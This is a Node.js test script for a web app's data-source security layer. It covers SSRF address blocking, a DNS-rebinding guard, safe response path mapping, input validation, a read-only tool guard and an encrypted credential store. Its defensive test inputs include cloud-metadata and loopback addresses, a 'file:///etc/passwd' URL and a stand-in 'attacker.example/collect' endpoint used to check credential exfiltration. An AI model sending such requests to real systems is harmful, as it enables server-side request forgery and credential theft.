#!/usr/bin/env node
/**
 * Checks for the data-source layer's security boundaries (src/server/data-sources):
 * network policy and DNS-rebinding guard, response mapping, input validation, the
 * read-only guard, and the encrypted credential store's owner and origin binding.
 *
 * Runs offline: DNS is stubbed, and nothing is fetched from the network. Set LIVE=1 to
 * also fetch one public API end to end through the real DNS guard.
 * Run: node scripts/check-data-sources.mjs
 */
import assert from "node:assert/strict";
import dns from "node:dns";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";

const root = resolve(dirname(new URL(import.meta.url).pathname), "..");
const require = createRequire(join(root, "package.json"));
const babel = require("@babel/core");
const preset = require.resolve("babel-preset-expo");

const compile = (file) =>
  babel.transformFileSync(file, {
    cwd: root,
    filename: file,
    babelrc: false,
    configFile: false,
    presets: [preset],
    caller: { name: "metro", platform: "web", bundler: "metro", isServer: true, isDev: true, supportsStaticESM: false },
  }).code;

// --- Minimal CommonJS loader for the app's TS modules (resolves the "@/" alias). ---
const cache = new Map();
function resolveModule(request, from) {
  if (!request.startsWith("@/") && !request.startsWith(".")) return null;
  const base = request.startsWith("@/") ? join(root, "src", request.slice(2)) : resolve(dirname(from), request);
  for (const ext of [".ts", ".tsx", "/index.ts"]) if (existsSync(base + ext)) return base + ext;
  return null;
}
function load(file) {
  if (cache.has(file)) return cache.get(file).exports;
  const module = { exports: {} };
  cache.set(file, module);
  const local = (request) => {
    const target = resolveModule(request, file);
    return target ? load(target) : require(request);
  };
  new Function("require", "module", "exports", compile(file))(local, module, module.exports);
  return module.exports;
}

const src = (path) => load(join(root, "src", path));
const policy = src("server/data-sources/network-policy.ts");
const { getJson } = src("server/data-sources/http.ts");
const mapping = src("server/data-sources/mapping.ts");
const { validateDataSource } = src("server/data-sources/validate.ts");
const { readOnlyViolation } = src("server/read-only.ts");
const credentials = src("server/data-sources/credentials.ts");
const { runDataSource } = src("server/data-sources/service.ts");

let passed = 0;
async function check(name, fn) {
  try {
    await fn();
    passed += 1;
    console.log(`  ok   ${name}`);
  } catch (error) {
    console.error(`  FAIL ${name}\n${error.stack ?? error}`);
    process.exitCode = 1;
  }
}

console.log("network policy");
await check("private, reserved and mapped addresses are blocked", () => {
  for (const ip of ["127.0.0.1", "10.1.2.3", "172.20.0.1", "192.168.1.1", "169.254.169.254", "100.100.100.100", "0.0.0.0",
    "::1", "::", "fd00::1", "fe80::1", "::ffff:127.0.0.1", "::ffff:a9fe:a9fe", "64:ff9b::a9fe:a9fe", "2002:7f00:1::", "not-an-ip"]) {
    assert.equal(policy.isBlockedAddress(ip), true, ip);
  }
  for (const ip of ["140.82.112.5", "1.1.1.1", "2606:4700:4700::1111"]) assert.equal(policy.isBlockedAddress(ip), false, ip);
});
await check("only public https URLs pass", () => {
  for (const url of ["http://api.github.com", "https://user:pw@api.github.com", "https://api.github.com:8443/x",
    "https://localhost/x", "https://db.internal/x", "https://printer.local", "https://intranet/x",
    "https://169.254.169.254/latest", "https://[::1]/", "https://[::ffff:7f00:1]/", "https://127.1/", "https://2130706433/", "file:///etc/passwd", "nonsense"]) {
    assert.throws(() => policy.checkUrl(url), policy.BlockedDestinationError, url);
  }
  assert.equal(policy.checkUrl("https://api.github.com/repos/a/b").hostname, "api.github.com");
});

console.log("DNS guard (stubbed DNS)");
const realLookup = dns.lookup;
const stubDns = (addresses) => {
  dns.lookup = (hostname, options, callback) => callback(null, addresses.map((address) => ({ address, family: address.includes(":") ? 6 : 4 })));
};
await check("a public name resolving to a private address is refused at connect", async () => {
  stubDns(["127.0.0.1"]);
  await assert.rejects(getJson("https://rebind.example.com/x", { headers: {}, sensitiveHeaders: [] }), policy.BlockedDestinationError);
});
await check("one private address among public ones is refused", async () => {
  stubDns(["93.184.216.34", "169.254.169.254"]);
  await assert.rejects(getJson("https://mixed.example.com/x", { headers: {}, sensitiveHeaders: [] }), policy.BlockedDestinationError);
});
dns.lookup = realLookup;

console.log("response mapping");
await check("paths read own properties and array indexes only", () => {
  const body = { data: { items: [{ title: "First" }, { title: "Second" }] }, count: 42, open: false, nothing: null };
  assert.equal(mapping.readPath(body, "data.items[1].title"), "Second");
  assert.equal(mapping.readPath([{ name: "x" }], "[0].name"), "x");
  assert.equal(mapping.readPath(body, "__proto__"), undefined);
  assert.equal(mapping.readPath(body, "constructor"), undefined);
  assert.equal(mapping.readPath(body, "data.items.length"), undefined);
  for (const bad of ["a..b", "a[x]", "a.b()", "$.a", "", "a[-1]"]) assert.equal(mapping.isValidPath(bad), false, bad);
});
await check("values become text, missing and non-scalars are reported, long text is cut", () => {
  const { values, missing } = mapping.applyMapping(
    { n: 42, b: false, s: "x".repeat(500), o: { a: 1 }, z: null },
    { n: "n", b: "b", s: "s", o: "o", z: "z", gone: "nope" },
    400,
  );
  assert.deepEqual(Object.keys(values).sort(), ["b", "n", "s"]);
  assert.equal(values.n, "42");
  assert.equal(values.b, "No");
  assert.equal(values.s.length, 400);
  assert.deepEqual(missing.sort(), ["gone", "o", "z"]);
});

console.log("validation");
const ref = "cred_123e4567-e89b-42d3-a456-426614174000";
const rest = (over) => ({ v: 1, connector: "rest", url: "https://api.github.com/repos/a/b", auth: { strategy: "none" }, mapping: { stars: "stargazers_count" }, ...over });
await check("a well-formed REST source passes", () => {
  assert.equal(validateDataSource(rest()).ok, true);
  assert.equal(validateDataSource(rest({ auth: { strategy: "apiKey", credentialRef: ref, in: "header", name: "X-Api-Key" } })).ok, true);
});
await check("unsafe REST sources are rejected", () => {
  const bad = [
    rest({ url: "http://api.github.com" }),
    rest({ url: "https://169.254.169.254/" }),
    rest({ headers: { Cookie: "a=b" } }),
    rest({ headers: { Authorization: "Bearer leaked" } }),
    rest({ auth: { strategy: "apiKey", credentialRef: ref, in: "header", name: "Host" } }),
    rest({ auth: { strategy: "bearer", credentialRef: "sk-live-secret" } }),
    rest({ mapping: {} }),
    rest({ mapping: { "bad name": "a" } }),
    rest({ cacheSeconds: 99999 }),
    rest({ v: 2 }),
    { ...rest(), connector: "shell" },
  ];
  for (const source of bad) assert.equal(validateDataSource(source).ok, false, JSON.stringify(source));
});
await check("read-only guard refuses writes and sandboxes, allows reads", () => {
  assert.equal(readOnlyViolation("GITHUB_GET_A_REPOSITORY", { owner: "a", repo: "b" }), null);
  assert.notEqual(readOnlyViolation("GITHUB_CREATE_AN_ISSUE", {}), null);
  assert.notEqual(readOnlyViolation("COMPOSIO_MULTI_EXECUTE_TOOL", { tools: [{ tool_slug: "GMAIL_SEND_EMAIL" }] }), null);
  assert.notEqual(readOnlyViolation("COMPOSIO_REMOTE_WORKBENCH", {}), null);
});

console.log("credential store");
const dataDir = mkdtempSync(join(tmpdir(), "wc-cred-"));
process.env.DATA_DIR = dataDir;
process.env.CREDENTIAL_KEY = "11".repeat(32);
const alice = "alice-device-0001";
const mallory = "mallory-device-02";
const secret = "sk_test_do_not_leak_123";
try {
  const saved = await credentials.saveCredential(alice, "Weather", "https://api.weather.example", secret);
  await check("the secret is encrypted at rest", () => {
    const file = readFileSync(join(dataDir, "credentials.json"), "utf8");
    assert.equal(file.includes(secret), false);
  });
  await check("only the owner can resolve it, and only for its origin", async () => {
    assert.equal(await credentials.resolveCredential(alice, saved.ref, "https://api.weather.example"), secret);
    assert.equal(await credentials.resolveCredential(mallory, saved.ref, "https://api.weather.example"), null);
    assert.equal(await credentials.resolveCredential(alice, saved.ref, "https://attacker.example"), null);
  });
  await check("a source pointing the credential at another host never sends it", async () => {
    stubDns(["93.184.216.34"]);
    const run = await runDataSource(alice, rest({ url: "https://attacker.example/collect", auth: { strategy: "bearer", credentialRef: saved.ref } }));
    dns.lookup = realLookup;
    assert.equal(run.ok, false);
    assert.equal(run.reason, "credential");
  });
  await check("listing never includes the secret; revoke removes it", async () => {
    const list = await credentials.listCredentials(alice);
    assert.equal(JSON.stringify(list).includes(secret), false);
    assert.equal(list.length, 1);
    assert.equal(await credentials.revokeCredential(mallory, saved.ref), false);
    assert.equal(await credentials.revokeCredential(alice, saved.ref), true);
    assert.equal(await credentials.resolveCredential(alice, saved.ref, "https://api.weather.example"), null);
  });
  await check("concurrent saves do not drop each other", async () => {
    await Promise.all(Array.from({ length: 8 }, (_, i) => credentials.saveCredential(alice, `k${i}`, "https://api.weather.example", `s${i}`)));
    assert.equal((await credentials.listCredentials(alice)).length, 8);
  });
} finally {
  dns.lookup = realLookup;
  rmSync(dataDir, { recursive: true, force: true });
}

if (process.env.LIVE) {
  console.log("live");
  await check("a public JSON API is fetched and mapped", async () => {
    const run = await runDataSource(alice, rest({ url: "https://api.github.com/repos/expo/expo", headers: { "x-github-api-version": "2022-11-28" }, mapping: { name: "full_name", stars: "stargazers_count", owner: "owner.login" } }));
    assert.equal(run.ok, true, run.message);
    assert.equal(run.values.name, "expo/expo");
    assert.match(run.values.stars, /^\d+$/);
  });
}

console.log(process.exitCode ? "\nSome checks failed." : `\nAll ${passed} checks passed.`);
